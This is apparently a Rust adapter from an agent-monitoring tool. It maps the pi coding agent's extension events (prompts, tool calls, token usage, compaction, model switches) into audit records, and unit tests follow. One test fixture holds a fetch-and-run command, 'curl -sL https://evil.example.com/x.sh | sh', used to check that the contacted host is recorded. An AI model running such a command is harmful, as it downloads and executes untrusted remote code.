//! pi.dev's extension events.
//!
//! pi has no hook configuration and no permission event. Extensions are
//! TypeScript modules auto-discovered from `~/.pi/agent/extensions/*.ts` and
//! loaded in-process, and gating a tool call is done by an extension's own
//! `tool_call` handler returning `{block, reason}` — so there is no
//! [`EventKind::Permission`] arm below, because there is nothing to map. An
//! arm for one would be the `permission.asked` mistake again: a name nothing
//! emits, reading as coverage in every report that counts events.
//!
//! The field names here come from `ExtensionAPI` in
//! `@earendil-works/pi-coding-agent@0.84.1` and `Usage`/`AssistantMessage` in
//! `@earendil-works/pi-ai@0.84.1`, not from prose documentation.
//!
//! The payloads are the ones `plugins/pi/argus.ts` builds, not pi's event
//! objects verbatim: pi's carry whole transcripts (`agent_end.messages`,
//! `turn_end.toolResults`) and an `AbortSignal`, none of which belongs on a
//! socket. The plugin flattens what is worth keeping, so every key read here
//! is a key that file writes.

use crate::config::CaptureCfg;
use crate::event::{Envelope, Event, EventKind};
use serde_json::Value;

pub fn parse(env: &Envelope, capture: &CaptureCfg) -> Vec<Event> {
    let p = &env.payload;
    // pi puts nothing about the session in the event itself — both of these
    // are read off the `ExtensionContext` by the plugin and forwarded.
    let session_id = p.get("sessionID").and_then(Value::as_str).map(String::from);
    let cwd = p.get("cwd").and_then(Value::as_str).map(String::from);
    let mk = |kind| Event::new("pi", session_id.clone(), cwd.clone(), kind);
    let event = p.get("event").and_then(Value::as_str).unwrap_or("");
    let max = capture.max_field_bytes;

    match event {
        "input" => vec![mk(EventKind::Prompt {
            text: if capture.prompts {
                crate::adapters::cap_text(
                    p.get("text").and_then(Value::as_str).unwrap_or_default(),
                    max,
                )
            } else {
                "[not captured]".into()
            },
        })],
        // A `!`-prefixed shell command the user ran themselves. It never
        // passes through `tool_call`, so as anything but a `ToolUse` it would
        // be a command execution invisible to every query about command
        // executions — and the `!!` form (`excludeFromContext`) is the one the
        // transcript itself never records either.
        //
        // Only a `pre` leg exists: pi asks extensions before running the
        // command and never reports what it produced.
        "user_bash" => {
            let args = serde_json::json!({
                "command": p.get("command").cloned().unwrap_or(Value::Null),
                "excludeFromContext": p.get("excludeFromContext").cloned().unwrap_or(Value::Null),
            });
            let user_bash_net = crate::adapters::extract_net_for_tool("user_bash", &args);
            vec![mk(EventKind::ToolUse {
                files: crate::adapters::extract_files_for_tool("user_bash", &args),
                fqdns: user_bash_net.fqdns,
                endpoints: user_bash_net.endpoints,
                file_contents: vec![],
                tool: "user_bash".into(),
                phase: "pre".into(),
                input: if capture.tool_inputs {
                    crate::adapters::cap_value(args, max)
                } else {
                    Value::Null
                },
                output: Value::Null,
                // Only a `pre` leg exists: pi never reports what the command
                // produced, so there is no result to read hosts out of.
                output_fqdns: vec![],
                output_endpoints: vec![],
                error: None,
                // pi reports neither on this event.
                duration_ms: None,
                interrupted: false,
            })]
        }
        // The two legs of one call, joined by `toolCallId`. `tool_result`
        // repeats the `input` it was called with, so both legs extract the
        // same files and hosts and a `pre` whose `post` never arrived is still
        // a complete record of what was attempted.
        "tool_call" | "tool_result" => {
            let post = event == "tool_result";
            let tool = p
                .get("toolName")
                .and_then(Value::as_str)
                .unwrap_or("unknown")
                .to_string();
            let args = p.get("input").cloned().unwrap_or(Value::Null);
            let files = crate::adapters::extract_files_for_tool(&tool, &args);
            let net = crate::adapters::extract_net_for_tool(&tool, &args);
            // pi reports failure as a boolean and puts the message in the
            // content, so the message is the tool's output. With output
            // capture off the failure still has to be recorded — losing the
            // fact that a call failed because its text was not collectable
            // would understate every error count.
            let error = if post && p.get("isError").and_then(Value::as_bool) == Some(true) {
                let text = p.get("output").and_then(Value::as_str).unwrap_or_default();
                Some(if !capture.tool_outputs || text.is_empty() {
                    "tool call failed".to_string()
                } else {
                    crate::adapters::cap_text(text, max)
                })
            } else {
                None
            };
            let raw_output = p.get("output").cloned().unwrap_or(Value::Null);
            let out_net = crate::adapters::extract_net_from_output(&raw_output).minus(&net);
            let mut ev = mk(EventKind::ToolUse {
                tool,
                phase: if post { "post" } else { "pre" }.into(),
                input: if capture.tool_inputs {
                    crate::adapters::cap_value(args, max)
                } else {
                    Value::Null
                },
                output: if post && capture.tool_outputs {
                    crate::adapters::cap_value(raw_output, max)
                } else {
                    Value::Null
                },
                error,
                // pi times tool execution internally and reports neither the
                // duration nor an interrupt to extensions.
                duration_ms: None,
                interrupted: false,
                files,
                fqdns: net.fqdns,
                endpoints: net.endpoints,
                output_fqdns: out_net.fqdns,
                output_endpoints: out_net.endpoints,
                file_contents: vec![],
            });
            ev.meta.tool_use_id = p
                .get("toolCallId")
                .and_then(Value::as_str)
                .map(String::from);
            vec![ev]
        }
        // One per finished assistant turn. The plugin drops the turns that
        // ended without an assistant message, so anything arriving here has a
        // receipt on it.
        //
        // `reasoning` is a *subset* of `output` in pi's accounting — the
        // output count already includes it — so the two are stored side by
        // side and never summed.
        "turn_end" => {
            let n = |ptr: &str| p.pointer(ptr).and_then(Value::as_u64).unwrap_or(0);
            let mut ev = mk(EventKind::Usage {
                input_tokens: n("/usage/input"),
                output_tokens: n("/usage/output"),
                reasoning_tokens: n("/usage/reasoning"),
                cache_read_tokens: n("/usage/cacheRead"),
                cache_write_tokens: n("/usage/cacheWrite"),
                cost: p
                    .pointer("/usage/cost/total")
                    .and_then(Value::as_f64)
                    .unwrap_or(0.0),
                finish: p
                    .get("stopReason")
                    .and_then(Value::as_str)
                    .map(String::from),
            });
            ev.meta.model = qualified_model(p.get("provider"), p.get("model"));
            // The provider's own id for the response where there is one. pi
            // numbers turns within a session regardless, and a turn with no
            // identifier at all cannot be joined to anything.
            ev.meta.turn_id = p
                .get("messageID")
                .and_then(Value::as_str)
                .map(String::from)
                .or_else(|| {
                    p.get("turnIndex")
                        .and_then(Value::as_u64)
                        .map(|i| i.to_string())
                });
            vec![ev]
        }
        // Compaction rewrites the session's own history. `tokensBefore` is the
        // size going in; pi never reports the size coming out, so the `after`
        // half stays empty rather than being guessed at.
        "session_before_compact" | "session_compact" => vec![mk(EventKind::Compact {
            phase: if event == "session_before_compact" {
                "pre"
            } else {
                "post"
            }
            .into(),
            // pi's own word for it — `manual`, `threshold` or `overflow`.
            // Folding the last two into "auto" would lose the distinction
            // between a session that grew into a compaction and one that
            // overflowed and is being retried.
            trigger: p
                .get("reason")
                .and_then(Value::as_str)
                .unwrap_or("unknown")
                .into(),
            tokens_before: p.get("tokensBefore").and_then(Value::as_u64),
            tokens_after: None,
            // Empty and absent mean the same thing: no directed compaction.
            instructions: p
                .get("customInstructions")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
                .map(|s| crate::adapters::cap_text(s, max)),
        })],
        // Everything else the plugin forwards is a session-level note. The
        // compaction and turn arms above are matched first, so this catches
        // the rest of the `session_`/`turn_`/`agent_` families plus the model
        // switch.
        e if e.starts_with("session_")
            || e.starts_with("turn_")
            || e.starts_with("agent_")
            || e == "model_select" =>
        {
            let mut ev = mk(EventKind::Session {
                action: event.into(),
                detail: crate::adapters::cap_value(detail(p), max),
            });
            // A model switch mid-session is the one place the model changes
            // without a turn ending, and `meta.model` is where every other
            // harness reports which model was in play.
            if event == "model_select" {
                ev.meta.model = qualified_model(p.get("provider"), p.get("model"));
            }
            vec![ev]
        }
        _ => vec![mk(EventKind::Raw { payload: p.clone() })],
    }
}

/// `provider/model`, because a bare model name is not unique: the same name is
/// served by more than one provider, and which one saw the turn is the whole
/// question a policy about third-party models is asking.
fn qualified_model(provider: Option<&Value>, model: Option<&Value>) -> Option<String> {
    let model = model.and_then(Value::as_str)?;
    Some(match provider.and_then(Value::as_str) {
        Some(provider) => format!("{provider}/{model}"),
        None => model.to_string(),
    })
}

/// The payload minus the three keys every event carries, so a session note
/// holds what is particular to it rather than a second copy of the envelope.
fn detail(p: &Value) -> Value {
    let mut detail = p.clone();
    if let Some(o) = detail.as_object_mut() {
        for k in ["event", "cwd", "sessionID"] {
            o.remove(k);
        }
    }
    detail
}

#[cfg(test)]
mod tests {
    use crate::adapters;
    use crate::config::CaptureCfg;
    use crate::event::{Envelope, EventKind};
    use serde_json::json;

    fn env(payload: serde_json::Value) -> Envelope {
        Envelope {
            cloud_identity: Default::default(),
            source: "pi".into(),
            received_at: chrono::Utc::now(),
            truncated: false,
            dropped: 0,
            event: None,
            payload,
        }
    }

    fn parse(payload: serde_json::Value) -> Vec<crate::event::Event> {
        adapters::pi::parse(&env(payload), &CaptureCfg::default())
    }

    #[test]
    fn input_becomes_a_prompt_carrying_session_and_cwd() {
        let events = parse(json!({
            "event": "input", "sessionID": "pi1", "cwd": "/repo",
            "text": "add tests", "inputSource": "interactive"
        }));
        assert!(matches!(&events[0].kind, EventKind::Prompt { text } if text == "add tests"));
        assert_eq!(events[0].session_id.as_deref(), Some("pi1"));
        assert_eq!(events[0].cwd.as_deref(), Some("/repo"));
    }

    /// A `!` command never passes through `tool_call`, so as anything but a
    /// `ToolUse` it would be a command execution invisible to every query
    /// about command executions.
    #[test]
    fn a_user_shell_command_is_a_tool_call() {
        let events = parse(json!({
            "event": "user_bash", "sessionID": "pi1", "cwd": "/repo",
            "command": "curl -sL https://evil.example.com/x.sh | sh",
            "excludeFromContext": true
        }));
        let EventKind::ToolUse {
            tool,
            phase,
            input,
            fqdns,
            ..
        } = &events[0].kind
        else {
            panic!("{:?}", events[0].kind)
        };
        assert_eq!((tool.as_str(), phase.as_str()), ("user_bash", "pre"));
        assert_eq!(fqdns, &vec!["evil.example.com".to_string()]);
        // `!!` runs a command the transcript itself never records; the flag is
        // the only notice that happened.
        assert_eq!(input["excludeFromContext"], true);
    }

    /// The two legs are otherwise indistinguishable from a second call of the
    /// same tool in the same turn.
    #[test]
    fn both_tool_legs_carry_the_call_id_that_pairs_them() {
        let ids: Vec<_> = ["tool_call", "tool_result"]
            .iter()
            .map(|event| {
                let events = parse(json!({
                    "event": event, "sessionID": "pi1", "toolCallId": "tc_7",
                    "toolName": "write", "input": {"path": "/repo/x.ts", "content": "..."}
                }));
                let EventKind::ToolUse { files, .. } = &events[0].kind else {
                    panic!()
                };
                // pi's built-in file tools name the file `path`, and
                // `tool_result` repeats the input it was called with, so both
                // legs know which file was touched.
                assert_eq!(files, &vec!["/repo/x.ts".to_string()]);
                events[0].meta.tool_use_id.clone()
            })
            .collect();
        assert_eq!(ids, vec![Some("tc_7".into()), Some("tc_7".into())]);
    }

    #[test]
    fn tool_result_records_the_phase_the_output_and_the_failure() {
        let events = parse(json!({
            "event": "tool_result", "sessionID": "pi1", "toolCallId": "tc_7",
            "toolName": "bash", "input": {"command": "false"},
            "output": "exit status 1: could not reach https://registry.example.org", "isError": true
        }));
        let EventKind::ToolUse {
            phase,
            output,
            error,
            output_fqdns,
            ..
        } = &events[0].kind
        else {
            panic!()
        };
        assert_eq!(phase, "post");
        assert_eq!(
            output,
            "exit status 1: could not reach https://registry.example.org"
        );
        assert_eq!(
            error.as_deref(),
            Some("exit status 1: could not reach https://registry.example.org")
        );
        // The host an error message named is exactly the kind of thing only
        // the result knows.
        assert_eq!(output_fqdns, &vec!["registry.example.org".to_string()]);

        // A call that succeeded is not an error, whatever it printed.
        let events = parse(json!({
            "event": "tool_result", "toolName": "bash", "isError": false, "output": "ok"
        }));
        let EventKind::ToolUse { error, .. } = &events[0].kind else {
            panic!()
        };
        assert!(error.is_none());
    }

    /// Losing the fact that a call failed because its text was not collectable
    /// would understate every error count.
    #[test]
    fn a_failure_is_still_recorded_when_outputs_are_not_captured() {
        let cfg = CaptureCfg {
            tool_outputs: false,
            ..CaptureCfg::default()
        };
        let events = adapters::pi::parse(
            &env(json!({"event": "tool_result", "toolName": "bash",
                        "isError": true, "output": "secret path /home/a/.ssh/id_ed25519"})),
            &cfg,
        );
        let EventKind::ToolUse { error, output, .. } = &events[0].kind else {
            panic!()
        };
        assert_eq!(error.as_deref(), Some("tool call failed"));
        assert!(output.is_null());
    }

    #[test]
    fn capture_flags_suppress_content() {
        let cfg = CaptureCfg {
            prompts: false,
            tool_inputs: false,
            ..CaptureCfg::default()
        };
        let events = adapters::pi::parse(&env(json!({"event": "input", "text": "secret"})), &cfg);
        let EventKind::Prompt { text } = &events[0].kind else {
            panic!()
        };
        assert_eq!(text, "[not captured]");

        let events = adapters::pi::parse(
            &env(json!({"event": "tool_call", "toolName": "write",
                        "input": {"path": "/a.ts", "content": "secret"}})),
            &cfg,
        );
        let EventKind::ToolUse { input, files, .. } = &events[0].kind else {
            panic!()
        };
        assert!(input.is_null());
        assert_eq!(files.len(), 1, "metadata still extracted");
    }

    /// Summing spend per session has to be a query, not a parse.
    #[test]
    fn a_finished_turn_becomes_a_usage_event() {
        let events = parse(json!({
            "event": "turn_end", "sessionID": "pi1", "turnIndex": 3,
            "messageID": "resp_1", "provider": "anthropic", "model": "claude-opus-5",
            "stopReason": "stop",
            "usage": {"input": 120, "output": 31, "reasoning": 9,
                      "cacheRead": 98, "cacheWrite": 12,
                      "cost": {"input": 0.01, "output": 0.03, "total": 0.0421}}
        }));
        let EventKind::Usage {
            input_tokens,
            output_tokens,
            reasoning_tokens,
            cache_read_tokens,
            cache_write_tokens,
            cost,
            finish,
        } = &events[0].kind
        else {
            panic!("{:?}", events[0].kind)
        };
        assert_eq!(
            (
                *input_tokens,
                *output_tokens,
                *reasoning_tokens,
                *cache_read_tokens,
                *cache_write_tokens
            ),
            (120, 31, 9, 98, 12)
        );
        assert_eq!(*cost, 0.0421);
        assert_eq!(finish.as_deref(), Some("stop"));
        assert_eq!(
            events[0].meta.model.as_deref(),
            Some("anthropic/claude-opus-5")
        );
        assert_eq!(events[0].meta.turn_id.as_deref(), Some("resp_1"));
    }

    /// A provider that omits the response id still leaves the turn joinable,
    /// and a payload missing every optional field still yields the counts that
    /// did arrive.
    #[test]
    fn usage_survives_a_payload_missing_its_optional_fields() {
        let events = parse(json!({
            "event": "turn_end", "sessionID": "pi1", "turnIndex": 3,
            "usage": {"input": 7}
        }));
        let EventKind::Usage {
            input_tokens,
            cost,
            finish,
            ..
        } = &events[0].kind
        else {
            panic!("{:?}", events[0].kind)
        };
        assert_eq!(*input_tokens, 7);
        assert_eq!(*cost, 0.0);
        assert!(finish.is_none());
        assert!(events[0].meta.model.is_none());
        assert_eq!(events[0].meta.turn_id.as_deref(), Some("3"));
    }

    /// The instructions are the only remaining evidence of what a compaction
    /// was told to drop — afterwards the transcript no longer holds it.
    #[test]
    fn compaction_keeps_its_trigger_size_and_instructions() {
        let events = parse(json!({
            "event": "session_before_compact", "sessionID": "pi1",
            "reason": "overflow", "willRetry": true, "tokensBefore": 180000,
            "customInstructions": "summarise the work, leave out the token I pasted"
        }));
        let EventKind::Compact {
            phase,
            trigger,
            tokens_before,
            tokens_after,
            instructions,
        } = &events[0].kind
        else {
            panic!("{:?}", events[0].kind)
        };
        assert_eq!((phase.as_str(), trigger.as_str()), ("pre", "overflow"));
        assert_eq!(*tokens_before, Some(180000));
        // pi reports the size going in and never the size coming out.
        assert!(tokens_after.is_none());
        assert!(instructions.as_deref().unwrap().contains("leave out"));

        let events = parse(json!({
            "event": "session_compact", "sessionID": "pi1", "reason": "manual",
            "tokensBefore": 180000, "customInstructions": ""
        }));
        let EventKind::Compact {
            phase,
            trigger,
            instructions,
            ..
        } = &events[0].kind
        else {
            panic!()
        };
        assert_eq!((phase.as_str(), trigger.as_str()), ("post", "manual"));
        // Empty and absent mean the same thing: no directed compaction.
        assert!(instructions.is_none());
    }

    #[test]
    fn session_turn_and_agent_notes_map_to_session_events() {
        for event in [
            "session_start",
            "session_shutdown",
            "turn_start",
            "agent_end",
        ] {
            let events = parse(json!({"event": event, "sessionID": "pi1", "cwd": "/repo",
                                      "reason": "startup"}));
            let EventKind::Session { action, detail } = &events[0].kind else {
                panic!("{event}: {:?}", events[0].kind)
            };
            assert_eq!(action, event);
            // The three keys every event carries are the envelope's, not this
            // event's — repeating them would be a second copy of the same
            // fields under a different name.
            assert!(detail.get("event").is_none(), "{event}: {detail}");
            assert!(detail.get("cwd").is_none(), "{event}: {detail}");
            assert!(detail.get("sessionID").is_none(), "{event}: {detail}");
            assert_eq!(detail["reason"], "startup", "{event}");
        }
    }

    /// A model switch is the one place the model changes without a turn
    /// ending, and `meta.model` is where every other harness reports it.
    #[test]
    fn a_model_switch_records_which_model_took_over() {
        let events = parse(json!({
            "event": "model_select", "sessionID": "pi1",
            "provider": "openai", "model": "gpt-5",
            "previousModel": "anthropic/claude-opus-5", "selectSource": "set"
        }));
        assert!(matches!(&events[0].kind,
            EventKind::Session { action, .. } if action == "model_select"));
        assert_eq!(events[0].meta.model.as_deref(), Some("openai/gpt-5"));
    }

    /// pi has no manifest: an extension's subscription list exists only as the
    /// `pi.on(...)` calls in the file, so that is what this reads. An event the
    /// plugin starts forwarding without an arm here lands in `Raw` — it is
    /// stored, and it is invisible to every query that asks about tool calls or
    /// spend, which is the failure that looks most like success.
    #[test]
    fn every_forwarded_event_has_an_arm() {
        let shim = crate::harness::pi::shim_source();
        let names: Vec<&str> = shim
            .match_indices("pi.on(\"")
            .filter_map(|(i, m)| shim[i + m.len()..].split_once('"'))
            .map(|(name, _)| name)
            .collect();
        assert!(
            names.len() >= 12,
            "parsed {names:?} — the registration form moved"
        );
        for name in names {
            let events = parse(json!({"event": name, "sessionID": "s", "cwd": "/repo"}));
            assert!(
                !matches!(&events[0].kind, EventKind::Raw { .. }),
                "{name} is forwarded but has no arm — it lands in raw"
            );
        }
    }

    #[test]
    fn an_unknown_event_falls_through_to_raw() {
        let events = parse(json!({"event": "mystery_event", "sessionID": "pi1"}));
        assert!(matches!(&events[0].kind, EventKind::Raw { .. }));
    }
}
